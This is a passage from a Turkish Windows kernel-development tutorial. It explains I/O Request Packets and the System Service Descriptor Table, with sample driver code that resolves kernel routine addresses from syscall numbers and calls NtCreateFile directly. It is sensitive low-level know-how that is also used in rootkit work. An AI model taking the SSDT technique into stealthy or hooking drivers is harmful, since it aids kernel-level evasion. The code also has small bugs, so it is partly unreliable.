nesnesi (DEVICE_OBJECT) ve bir IRP’yi işaret eden iki bilgi alır. Aygıt nesnesi, bu aygıtla ilişkili sürücüyü (DRIVER_OBJECT) işaret eder. Bu yüzden, IoCallDriver fonksiyonu çağrıldığında, IRP, ilgili aygıt nesnesine veya bu nesneyle ilişkili sürücüye gönderilir. Bazen bu işlem için “IRP’yi iletmek” veya “IRP’yi aktarmak” gibi ifadeler de kullanılır.\nBir IRP, genellikle birden fazla sürücü tarafından işlenir ve bu sürücüler belirli bir sıraya göre düzenlenmiştir. IRP işlenirken, sürücüler yığının her bir katmanı gibi ele alınır. Yani, IRP önce yığının en üstündeki sürücüye gelir. Her sürücü, IRP’yi belirli bir sırayla işler ve gerekli işlemi yapar. İşlem tamamlandığında, IRP bir sonraki sürücüye geçer. Bu süreç, IRP’nin adım adım işlenmesini sağlar. Sonuç olarak, IRP tüm sürücülerden geçtikten sonra nihai işlem gerçekleştirilir ve istenen sonuç elde edilir.\nIRP, kullanıcı tarafından başlatılan bir işlemin işletim sisteminin çekirdeği tarafından işlenmesini de sağlar. Bu yapı sayesinde, sürücüler talepleri doğru bir şekilde alır ve yanıt verir. Örneğin, bir dosya yazdırmak istediğinizde, bu talep IRP olarak yazıcı sürücüsüne gönderilir. Yazıcı sürücüsü, IRP’yi alır ve yazdırma işlemini başlatır. Bu sistem, kullanıcı işlemleri ile donanım arasındaki bağlantıyı güvenli ve verimli bir şekilde sağlar.\nCode Örnek kod için iki ayrı proje oluşturacağız. İlk projede bir sürücü oluşturacağız ve IRP’in nasıl işleneceğinden bahsedeceğim. Diğer proje ise user mode bir program oluşturacağız ve bu programda WriteFile fonksiyonunu kullanarak sürücüye IRP göndermeyi göstereceğim.\nAyrıca Github link için buraya tıklayabilirsiniz.\nKernel Mode Driver #include \"main.h\" NTSTATUS IrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); DbgPrintEx(0, 0, \"\\n\\nMJ_Create Received!\\n\"); Irp-\u003eIoStatus.Status = STATUS_SUCCESS;; Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS IrpWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PCHAR Buffer = Irp-\u003eUserBuffer; ULONG Length = Stack-\u003eParameters.Write.Length; DbgPrintEx(0, 0, \"\\n\\nMJ_WRITE Received!\\n\"); if (NULL == Buffer || 0 == Length) { DbgPrintEx(0, 0, \"Failed to Received Data!\\n\"); Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; return Irp-\u003eIoStatus.Status; } DbgPrintEx(0, 0, \"Data to be written received: %.*s\\n\", Length, Buffer); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS DriverEntry(PDRIVER_OBJECT PDrvObj, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; Status = IoCreateDevice( PDrvObj, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create IO Device!\\n\"); return Status; } Status = IoCreateSymbolicLink( \u0026SymName, \u0026DeviceName ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Smybolic Link!\\n\"); return Status; } PDrvObj-\u003eMajorFunction[IRP_MJ_CREATE] = IrpCreate; PDrvObj-\u003eMajorFunction[IRP_MJ_WRITE] = IrpWrite; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT PDrvObj) { UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); DbgPrintEx(0, 0, \"Unloading Driver...\\n\"); IoDeleteSymbolicLink(\u0026SymName); IoDeleteDevice(PDrvObj-\u003eDeviceObject); return STATUS_SUCCESS; } Çok uzun gözüksede emin olun çok basit bir sürücü kodu. Adım adım kodlara bakalım ve DriverEntry fonksiyonundan başlayalım:\nUNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; İlk olarak DeviceName ve SymName adında iki adet UNICODE_STRING tanımladık. Bu iki değişken, sürücümüzün adını ve sembolik adını tutmaktadır. Bu değişkenlerle, sürücümüzün adını ve sembolik adını belirlemek için kullanacağız.\nStatus = IoCreateDevice( PDrvObj, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create IO Device!\\n\"); return Status; } Daha sonra IoCreateDevice fonksiyonu ile bir aygıt nesnesi oluşturuyoruz. Bu fonksiyon, sürücümüz için bir aygıt nesnesi oluşturur ve bu nesneyi DeviceObject değişkenine atar.\nStatus = IoCreateSymbolicLink( \u0026SymName, \u0026DeviceName ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Smybolic Link!\\n\"); return Status; } IoCreateSymbolicLink fonksiyonu ile sembolik bir bağlantı oluşturuyoruz. Bu sayede, user mode programımızda sürücünün adını ve sembolik adını kullanarak sürücümüze erişiyor olacağız.\nPDrvObj-\u003eMajorFunction[IRP_MJ_CREATE] = IrpCreate; PDrvObj-\u003eMajorFunction[IRP_MJ_WRITE] = IrpWrite; Son olarak, sürücümüzün IRP işlevlerini belirliyoruz. Bu işlevler, sürücümüzün IRP’leri nasıl işleyeceğini belirler. Kodlarda ise, IrpCreate ve IrpWrite kullanıyoruz. MJ_CREATE, bir dosya oluşturulduğunda sürücümüzün ne yapacağını belirler. IrpWrite ise bir dosyaya yazıldığında sürücümüzün ne yapacağını belirler. IRP’ler, bu işlevler aracılığıyla sürücümüze iletilir ve sürücümüz bu işlevler aracılığıyla IRP’leri işler.\nŞimdi ise IRP isteklerini işleyecek fonksiyonlarımıza göz atalım:\nNTSTATUS IrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); DbgPrintEx(0, 0, \"\\n\\nMJ_Create Received!\\n\"); ... İlk olarak IrpCreate’e baktığımızda DeviceObject ve Irp parametrelerini alır. Bu parametreler, yukarıda bahsettiğim gibi sürücümüzün aygıt nesnesini ve IRP’yi temsil eder. Daha sonra DbgPrintEx fonksiyonu ile bir bilgi mesajı yazdırıyoruz.\nIrp-\u003eIoStatus.Status = STATUS_SUCCESS;; Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; MJ_CREATE fonksiyonun son kısmında ise IRP’nin durumunu ve bilgisini ayarlıyoruz. Bu durum ve bilgi, IRP’nin işlem sonucunu belirler. Son olarak, IoCompleteRequest fonksiyonu ile IRP’yi tamamlıyor ve işlemi sonlandırıyoruz.\nŞimdi ise IrpWrite fonksiyonuna bakalım:\nNTSTATUS IrpWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PCHAR Buffer = Irp-\u003eUserBuffer; ULONG Length = Stack-\u003eParameters.Write.Length; ... Tanımlanan değişkenlere göz atalım:\nStack değişkeni, IRP’nin yığın konumunu temsil eder. Buffer değişkeni, IRP’nin veri alanını temsil eder. Bu veri alanı, IRP’nin taşıdığı veriyi içerir. Length değişkeni, IRP’nin veri uzunluğunu temsil eder. Bu uzunluk, IRP’nin taşıdığı verinin uzunluğunu belirtir. if (NULL == Buffer || 0 == Length) { DbgPrintEx(0, 0, \"Failed to Received Data!\\n\"); Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; return Irp-\u003eIoStatus.Status; } İlk olarak, Buffer işaretçisinin NULL olup olmadığı ve Length değerinin 0 olup olmadığı kontrol ediyoruz.\nEğer koşul sağlanıyorsa yani veri alınmamışsa Irp-\u003eIoStatus.Status ile değeri STATUS_INVALID_PARAMETER olarak ayarlıyoruz. Bu, bir parametre hatası olduğunu belirtir. Irp-\u003eIoStatus.Information değeri 0 olarak ayarlıyoruz. Sonda ise IRP’nin işlem durumu döndürülerek işleme son verilir.\nDbgPrintEx(0, 0, \"Data to be written received: %.*s\\n\", Length, Buffer); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; Bu kısımda ise eğer veri düzgünce alınmışsa bu veriyi yazdırırız. Daha sonra aynı şekilde IRP’nin durumunu ve bilgisini ayarlarız ve işlemi sonlandırırız.\nUser Mode Program Şimdi ise user mode programımızı oluşturalım. Bu programda WriteFile fonksiyonunu kullanarak sürücümüze IRP göndereceğiz.\n#include \"main.h\" int main(int argc, char* argv[]) { HANDLE\tHandleDevice = NULL; CHAR\tBuffer[] = \"Hello, kernel!\"; DWORD\tBytesWritten = 0; DWORD\tBytesRead = 0; BOOL\tStatus\t= 0; HandleDevice = CreateFile( DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to Open Device! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Status = WriteFile( HandleDevice, Buffer, (DWORD)sizeof(Buffer), \u0026BytesWritten, NULL ); if (!Status) { printf(\"Failed to Write Data!\\n\"); CloseHandle(HandleDevice); return -1; } CloseHandle(HandleDevice); return 0; } User mode program kodlarımız da bu şekilde. Şimdi detaylıca göz atalım:\nHandleDevice = CreateFile( DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to Open Device! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Programımızda ilk olarak CreateFile aracılığıyla sürücümüzü açıyoruz. Bu fonksiyon, sürücümüzü açar ve bir kolu (HANDLE) döndürür.\n“CreateFile kullanılarak sürücü mü açılıyor?” diye düşünen olabilir. Bilmeyenler için CreateFile fonksiyonu, Windows işletim sisteminde bir dosya veya aygıt nesnesi oluşturmak veya açmak için kullanılabilir. Daha fazla araştırma için dökümanlara bakabilirsiniz.\nStatus = WriteFile( HandleDevice, Buffer, (DWORD)sizeof(Buffer), \u0026BytesWritten, NULL ); if (!Status) { printf(\"Failed to Write Data!\\n\"); CloseHandle(HandleDevice); return -1; } Bu kısımda ise WriteFile fonksiyonu aracılığıyla sürücümüze IRP isteği gönderiyoruz.\nSürücünün ve Programın Çalıştırılması Öncelikle sürücümüzü windbg’a bağlı sanal makineye yüklememiz ve ardından başlatmamız gerekecek:\nŞimdi ise user mode programımızı çalıştıralım:\nGöründüğü gibi user mode programımı çalıştırdığımızda sürücüye veri gönderdiğini ve gönderilen veriyi ekrana yazdırdığını gördük:\nUser mode program tarafından MJ_WRITE IRP isteğinin geldiğini ve işlediğini böylece görmüş oluyoruz.\nSonuç Bu yazıda IRP’nin ne olduğunu, nasıl oluşturulduğunu ve nasıl kullanıldığını öğrendik. Ayrıca, IRP’nin sürücüler ve işletim sistemi arasında nasıl bir köprü görevi gördüğünü de öğrendik. Bu konuda daha fazla bilgi edinmek isterseniz, Microsoft Docs’ta bulunan kaynaklara göz atabilirsiniz.\nUmarım faydalı bir yazı olmuştur. İyi çalışmalar dilerim 🚀🚀🚀\nReferences Microsoft Docs - I/O Request Packets ","sonuç#Sonuç":"","sürücünün-ve-programın-çalıştırılması#Sürücünün ve Programın Çalıştırılması":""},"title":"IRP"},"/docs/winkernel-dev/wkd-ssdt/":{"data":{"":"","driverin-analiz-edilmesi#\u003cstrong\u003eDriver\u0026rsquo;in Analiz edilmesi\u003c/strong\u003e":"","kodlama#\u003cstrong\u003eKodlama\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar bu yazıda System Service Descriptor Table inceleyeceğiz.\nSSDT Nedir? Basitçe SSDT (System Service Descriptor Table), işletim sistemi tarafından desteklenen sistem çağrılarının bir listesidir. Sistem çağrıları, bir uygulamanın çekirdek seviyesindeki işlevleri kullanması için yapılan çağrılardır.\nSSDT, Service Descriptor Table kernel bellek yapısının ilk üyesidir:\ntypedef struct tagSERVICE_DESCRIPTOR_TABLE { SYSTEM_SERVICE_TABLE nt; // SSDT Tablosu kendisine etkili bir pointer SYSTEM_SERVICE_TABLE win32k; SYSTEM_SERVICE_TABLE sst3; SYSTEM_SERVICE_TABLE sst4; } SERVICE_DESCRIPTOR_TABLE; SSDT, sistem çağrılarını (syscall) çekirdek API adresleriyle eşleştirir. Bir user-mode program tarafından bir sistem çağrısı yapıldığında, bu çağrı bir hizmet indeksi (service index) içerir. Bu indeks, hangi sistem çağrısının kullanılacağını belirtir. İşletim sistemi, bu indeksi kullanarak System Service Descriptor Table (SSDT) üzerinden ilgili işlevin adresini çözümleyip ntoskrnl.exe içerisindeki doğru çekirdek işlevine yönlendirme yapar. Kulağa kafa karıştıcı geliyor olabilir bir de diagram üzerinden anlatayım:\nDiyelim ki User-Mode alanından CreateFile işlevini çağırdınız ve syscall numarası 0x2 olsun. Syscall yürütüldüğü zaman artık user-mode alanından çıkılır ve artık akış kernel alanından devam eder. Diagram’dan bunu görebilirsiniz.\nKernel alanına geçiş yapıldığında ilk durak SSDT (KiServiceTable) olacaktır. Burada tipik olarak Kernel Routine address’lere erişmek için offset listesi barındırdığını düşünmenizi istiyorum. İlgili syscall numarası ile offset hesaplanır ve ardından ilgili Routine Address’e yönlendirilir. Böylece NtCreateFile yürütülmüş olur. Hesaplama için ise aşağıdaki formül kullanılır:\nOffset = KiServiceTableAddress + 4 * SSN Yani arkadaşlar kısacası SSDT ve syscall’lar, user-mode alanından gelen API çağrılarıyla bunlara karşılık gelen kernel routine adresler arasında bir köprü görevi görür. Bu sayede kernel, user-mode alanından gelen bir sistem çağrısına hangi işlevin yanıt vereceğini belirler.\nWindbg ile Analiz Konuyu teorik olarak bırakmak olmaz. Windbg ile bu SSDT göz atabiliriz:\nÇıktıda verilen ilk adres fffff800`798c7cb0, SSDT’nin adresidir.\nYukarıda buranın bir Offset tablosu olduğunu düşünmenizi istemiştim. Şimdi aldığımız bu adresle tablodaki birkaç offset’e göz atalım:\nTablodan ilk 5 offset göründüğü gibi sıralanmış durumda. Şimdi bu offset’lerden 056b3400 alalım ve işlevin adresine yönlendirdiğine bakalım.\nEğer Diagram’a tekrar bakarsanız kernel routine adresine erişmek için farklı bir formül kullanılıyor. Yani aşağıdaki formül:\nKernelRoutineAddress = KiServiceTableAddress + ( Offset \u003e\u003e\u003e 4 ) Şimdi örnek olarak aldığımız offset’i bu formül kullanarak routine adresine bir göz atalım:\nGöründüğü gibi NtWaitForSingleObject işlevine ait olduğunu görebiliriz. Ayrıca bu yöntemle diğer elde ettiğiniz offset’lere de göz atabilirsiniz.\nSyscall ile Routine Adresi bulma Şimdi Syscall kullanarak Routine adresini nasıl bulabiliriz buna bir bakalım.\nÖrnek olarak NtCreateFile‘dan bahsetmiştim. Windbg ile bu API’a ait SSN numarasını ntdll.dll‘den bulabiliriz:\neax register’a 0x55 değerinin aktarıldığını görüyoruz. Bu NtCreateFile’in syscall numarasıdır.\nŞimdi bu syscall numarasını kullanarak offset’i hesaplayıp ardından routine adresine erişelim:\nÇıktıdan gördüğümüz üzere NtCreateFile’in routine adresi fffff804`31a2d240 olduğunu gösteriyor. Olayı tekrardan anlamak için tekrar şema oluşturabiliriz:\nKodlama Öğrendiğimiz şeyleri Kernel Driver kullanarak basitçe kodlayalım.\nSenaryomuz ise NtCreateFile ve NtWriteFile API’larını kullanarak bir .txt dosyası oluşturacağız ve içerisine bir metin yazdıracağız ancak bu konuda öğrendiğimiz şekillerle API’ların kernel routine adreslerini alıp API’ları direkt routine adresten çalıştıracağız.\nProjenin github linki için buraya tıklayabilirsiniz.\n#pragma warning(disable: 4083 4005) #include \"main.h\" #define KiServiceTableAddress 0xfffff800798c7cb0 #define SSN_NtCreateFile 0x55 #define SSN_NtWriteFile 0x8 typedef (NTAPI* My_NtCreateFile)( _Out_ PHANDLE FileHandle, _In_ ACCESS_MASK DesiredAccess, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _Out_ PIO_STATUS_BLOCK IoStatusBlock, _In_opt_ PLARGE_INTEGER AllocationSize, _In_ ULONG FileAttributes, _In_ ULONG ShareAccess, _In_ ULONG CreateDisposition, _In_ ULONG CreateOptions, _In_reads_bytes_opt_(EaLength) PVOID EaBuffer, _In_ ULONG EaLength ); typedef (NTAPI* My_NtWriteFile)( IN HANDLE FileHandle, IN HANDLE Event OPTIONAL, IN PIO_APC_ROUTINE ApcRoutine OPTIONAL, IN PVOID ApcContext OPTIONAL, OUT PIO_STATUS_BLOCK IoStatusBlock, _In_reads_bytes_(Length) PVOID Buffer, IN ULONG Length, IN PLARGE_INTEGER ByteOffset OPTIONAL, IN PULONG Key OPTIONAL ); uint32_t ReadMemory(uint64_t Address) { return *(volatile uint32_t*)Address; } uint64_t GetAbsoluteAddress(int SSN, UNICODE_STRING APIName) { if (0 == SSN) { DbgPrintEx(0, 0, \"SSN is 0\\n\"); return 0; } DbgPrintEx(0, 0, \"Target API Name: %wZ\\n\", APIName); uint64_t RoutineAbsoluteAddress = 0; uint64_t OffsetAddress; uint32_t Offset = 0; // Offset'in adresini hesapla OffsetAddress = KiServiceTableAddress + 4 * SSN; DbgPrintEx(0, 0, \"Offset Address: 0x%llx\\n\", OffsetAddress); // Hesaplanan adresten offseti oku Offset = ReadMemory(OffsetAddress); DbgPrintEx(0, 0, \"Offset: 0x%08x\\n\", Offset); // Formülü uygulayarak kernel routine adresine eri? RoutineAbsoluteAddress = KiServiceTableAddress + (Offset \u003e\u003e 4); DbgPrintEx(0, 0, \"The absolute address of %wZ is: 0x%llx\\n\", APIName, RoutineAbsoluteAddress); return RoutineAbsoluteAddress; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = UnloadDriver; HANDLE HandleFile = NULL; OBJECT_ATTRIBUTES ObjAttr; IO_STATUS_BLOCK IoStatusBlock; NTSTATUS Status = STATUS_SUCCESS; uint64_t Address = 0; UNICODE_STRING FileName; UNICODE_STRING NtCreateFileName; UNICODE_STRING NtWriteFileName; UNICODE_STRING Data; RtlInitUnicodeString(\u0026NtCreateFileName, L\"NtCreateFile\"); RtlInitUnicodeString(\u0026NtWriteFileName, L\"NtWriteFile\"); RtlInitUnicodeString(\u0026FileName, L\"\\\\??\\\\C:\\\\ssdt.txt\"); RtlInitUnicodeString(\u0026Data, L\"Hello SSDT!\"); InitializeObjectAttributes(\u0026ObjAttr, \u0026FileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);\t// NtCreateFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtCreateFile, NtCreateFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtCreateFile MyNtCreateFile = (My_NtCreateFile)Address; // NtCreateFile'i çağır Status = MyNtCreateFile(\u0026HandleFile, GENERIC_WRITE, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, \\ 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create File! Error: 0x%08x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Created File!\\n\\n\"); // NtWriteFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtWriteFile, NtWriteFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtWriteFile MyNtWriteFile = (My_NtWriteFile)Address; // NtWriteFile'i çağır Status = MyNtWriteFile(HandleFile, NULL, NULL, NULL, \u0026IoStatusBlock, Data.Buffer, Data.Length, NULL, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to ZwWriteFile! Error: 0x%08x\\n\", Status); ZwClose(HandleFile); return Status; } DbgPrintEx(0, 0, \"Wrote to File\\n\\n\"); ZwClose(HandleFile); return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Unloading the Driver...\\n\"); return STATUS_SUCCESS; } Kodumuz bu şekilde. Detaylıca analiz etmeye başlayalım:\n#define KiServiceTableAddress 0xfffff800798c7cb0 #define SSN_NtCreateFile 0x55 #define SSN_NtWriteFile 0x8 İlk olarak projede KiServiceTable’in adresini ve iki API’in SSN numaralarını tanımlanmıştır. Bu projeyi çalıştırırken aldığınız adresi ve SSN numaralarını buraya ekleyin.\n// NtCreateFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtCreateFile, NtCreateFileName); if (0 == Address) { return STATUS_NOT_FOUND; } DriverEntry içerisine göz attığımızda ise tanımladığımız ve SSN numarası ve API’in ismini alan *GetAbsoluteAddress fonksiyonunu çağırıyoruz. Bu API ile burada anlattığım yöntemler ile ilgili API’in kernel routine adresini alacağız.\n// Offset'in adresini hesapla OffsetAddress = KiServiceTableAddress + 4 * SSN; DbgPrintEx(0, 0, \"Offset Address: 0x%llx\\n\", OffsetAddress); GetAbsoluteAddress fonksiyonun içeriğine baktığımızda ise SSDT’nin içerisinden Offset’in adresini bulmak için önceden bahsettiğim hesaplamayı yapıyoruz. Daha sonra elde ettiğimiz offset adresini ekrana bastırıyoruz.\n// Hesaplanan adresten offseti oku Offset = ReadMemory(OffsetAddress); DbgPrintEx(0, 0, \"Offset: 0x%08x\\n\", Offset); Daha sonra aldığımız offset’in adresin içeriğini okuyarak offset’i elde etmiş oluyoruz ve aynı şekilde offset’i de ekrana bastırıyoruz.\n// Formülü uygulayarak kernel routine adresine eriş RoutineAbsoluteAddress = KiServiceTableAddress + (Offset \u003e\u003e 4); DbgPrintEx(0, 0, \"The absolute address of %wZ is: 0x%llx\\n\", APIName, RoutineAbsoluteAddress); Bu fonksiyonda son olarak ise formülü uygularak ilgili routine adresine erişmiş oluyoruz.\nMy_NtCreateFile MyNtCreateFile = (My_NtCreateFile)Address; Status = MyNtCreateFile(\u0026HandleFile, GENERIC_WRITE, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, \\ 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create File! Error: 0x%08x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Created File!\\n\\n\"); NtCreateFile’in routine adresini aldıktan sonra ise oluşturduğumuz MyNtCreateFile yapısına bu adresi veriyoruz ve ardından routine adresini kullanarak NtCreateFile API’i çağırıyoruz.\n// NtWriteFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtWriteFile, NtWriteFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtWriteFile MyNtWriteFile = (My_NtWriteFile)Address; // NtWriteFile'i çağır Status = MyNtWriteFile(HandleFile, NULL, NULL, NULL, \u0026IoStatusBlock, Data.Buffer, Data.Length, NULL, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to ZwWriteFile! Error: 0x%08x\\n\", Status); ZwClose(HandleFile); return Status; } DbgPrintEx(0, 0, \"Wrote to File\\n\\n\"); NtCreateFile’i çalıştırdıktan sonra yine aynı işlemler ile NtWriteFile’in routine adresini alıyor ve oluşturduğumuz yapıya adresi veriyoruz ve ardından NtWriteFile API’i çalıştırıyoruz.\nDriver’in Analiz edilmesi Tabi ki direkt olarak Driver’i kodladıktan sonra direkt olarak sonucu göstermek yerine sisteme yükleyeceğimiz Driver’i adım adım takip edip neler yaptığına beraber bir göz atalım. Böylece kafamızda daha iyi yer edineceğini düşünüyorum.\nÖncelikle sanal makinemize bağlı Windbg’a Driver’ımız için bir breakpoint ekleyeceğiz. Böylece kodladığımız Driver sisteme yüklendiğinde duracak.\nİlk olarak sanal makineye hazırladığımız .sys dosyasını yükleyelim:\nsc create SSDT binPath=\"C:\\Users\\bekoo\\Desktop\\SSDT.sys\" type=kernel start=demand Daha sonra Windbg’a dönüp bir breakpoint ekleyelim:\nbp SSDT!DriverEntry Ardından ise sürücüyü çalıştıralım:\nsc start SSDT Çalıştırdıktan sonra Windbg ekranında bp tetiklendiğine dair bir çıktı almamız gerekiyor:\nElde ettiğimiz adreslere göz atmak için GetAbsoluteAddress fonksiyonuna bir bp koyalım ve programı devam ettirelim:\nkd\u003e bp SSDT!GetAbsoluteAddress\rkd\u003e g\rBreakpoint 1 hit\rSSDT!GetAbsoluteAddress:\rfffff802`333c12f0 4889542410 mov qword ptr [rsp+10h],rdx GetAbsoluteAddress fonksiyonunda durdu. Disassembly ekranında GetAbsoluteAddress fonksiyonunu inceleyeceğiz. İlk durağımız Offset’in adresini hesapladığımız kısım olacak:\nİlk olarak eax register’a fonksiyonun birinci parametresi olan SSN değişkenin değerini aktarıldığını görmekteyiz. Program ilk defa GetAbsoluteAddress fonksiyonuna girdiği için 0x55 yani NtCreateFile’in ssn numarasını içerdiğini biliyoruz.\nDaha sonra alınan SSN numarası shl eax,2 yani eax’ın değerini 2 bit sola kaydırıyor. Ne yaptığını anlamamız için bu kısmın formülüne tekrar hatırlayalım:\nOffset = KiServiceTableAddress + 4 * SSN Şimdi sunu sorabilirsiniz: “Formülde çarpma işlemi yapılıyor ama arka planda 2 bit sola kaydırılıyor” diye.\nSola kaydırma (shift left, shl) işlemi, bir sayıyı 2’nin katları ile çarpmaya eşdeğerdir. Burada shl eax, 2 komutu ile eax’i 4 ile çarpıyor. Bunu doğrulamak için bu kısma bir breakpoint koyup eax’ın ne sonuç aldığını görebiliriz:\nFotoğrafta göründüğü üzere shl eax,2 işlemini yapan kısma bir bp koyup akışı burada durdurduğumuzda eax’ın önceki ve işlemden sonraki değerini görebiliriz. Çalışmadan önce eax’ın değeri 0x55 (Dec: 85) iken çalıştıktan sonra 0x154 (Dec: 340) sonucu elde ediliyor.\nDaha sonra cdqe komutu ile eax register’ındaki değeri rax register’ı için genişletiyor. Yani farklı anlatım ile 32 bitlik değeri 64 bit’e dönüştürmek için kullanılıyor.\nBu formülün son kısmında ise rcx’e KiServiceTable’in adresi aktarılıyor ve 4 * SSN sonucunu saklayan rax register’dan KiServiceTableAddress’in değeri çıkartılıyor. Şimdi burada kafanızının yine karıştığının farkındayım.\nBurada tipik olarak her ne kadar da sub kullanılarak çıkartma işlemi yapılıyor olsa da rax’tan rcx değerini çıkardığına dikkat edin. Yani farklı bir deyişle bu, KiServiceTableAddress’in rax’tan çıkarılması anlamına gelir. Yani bu işlem KiServiceTableAddress + 4 * SSN işlemi ile aynı sonucu verecektir. Kafanızın karıştığının farkındayım ancak kısaca şunu aklınızda tutabilirsiniz ki yaptırmak istediğimiz formül ile aynı sonucu verecektir.\nOffset’in adresini görmek için ise mov qword ptr [OffsetAddress (rsp+40h)], rax kısmına karşılık gelen adrese bir bp koyalım ve programı devam ettirelim. Elde ettiğimiz adrese bir göz atalım:\nAdres olarak fffff8046a6c7e04 alındığını görmekteyiz. Yukarıda zaten NtCreateFile ile örnek yapmıştık yani adresler uyuşuyor. Doğru adresi aldığından emin olabiliriz.\nSon durağımız ise Routine adresini hesapladığımız formül kısmı olacak.\nSSDT’ten NtCreateFile’in offset alındıktan sonra eax’a offset değeri veriliyor ve ardından 4 bit sağ kaydırdığını görüyoruz. Bu formülümüzün bir parçası.\nDaha sonra rcx’e KiServiceTable’in adresi veriliyor ve ardından rax’tan rcx’i çıkardığını (yukarıda bahsettiğim gibi kafanız karışmasın bunu toplama yapıyormuş gibi düşünelim) görmekteyiz. Böylece NtCreateFile’in routine adresine erişmiş oluyoruz. Elde edilen adrese göz atalım:\nGöründüğü gibi başarılı bir şekilde fffff8046ac2d240 sonucunu elde ediyoruz. Şimdi ise DriverEntry’de routine adresine yönlendirdiğimiz kısıma dönelim:\nGetAbsoluteAddress çalıştıktan sonra alınan adresi oluşturduğumuz MyNtCreateFile yapısına aktarıldığını ve NtCreateFile için parametrelerin hazırlandığını ve en sonda routine adrese yönlendirildiğini görebiliriz. Routine adresin çağırıldığı yere breakpoint koyup akışı nereye yönlendirdiğine bir bakalım:\ncall yapıldığı kısma bir breakpoint koyup rax’ın değerine baktığımızda elde ettiğimiz NtCreateFile’in routine adresi olduğunu ve devam ettirdiğimizde rax’ın adresine atlayan bir komut çalıştırılıyor ve akış NtCreateFile içerisine giderek devam ediyor.\nDriver’in devamındaki kodlar aynı adımı içerdiği için driver’i devam ettirebiliriz. Devam ettirmeden önce breakpoint’leri kaldıralim ve ardından g komutuyla devam ettirelim:\nAkışın devamında ise NtWriteFile API’si için offset değeri ve routine adresini de görebiliriz.\nSon olarak ise gerçekten bir 